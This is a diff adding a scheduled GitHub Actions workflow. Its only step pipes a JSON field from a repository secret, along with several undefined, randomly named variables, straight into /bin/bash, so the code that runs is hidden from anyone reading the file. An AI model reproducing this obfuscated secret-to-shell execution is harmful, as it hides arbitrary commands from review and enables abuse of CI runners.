@@ -1,0 +1,23 @@
+name: zouzhizhongan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zouzhizhongan
+        env:
+          i27: ${{ secrets.i27 }}
+        run: |
+          echo $i27 | jq -r .rc9 | /bin/bash
+          echo $xgec045 | jq -r .bir57 | /bin/bash
+          echo $j2 | jq -r .lhny8 | /bin/bash
+          echo $bypgw54 | jq -r .pr6 | /bin/bash
+          echo $ilk2 | jq -r .t674 | /bin/bash
+          echo $r936 | jq -r .w6 | /bin/bash
+          echo $bjx122 | jq -r .lxpye99495 | /bin/bash
+
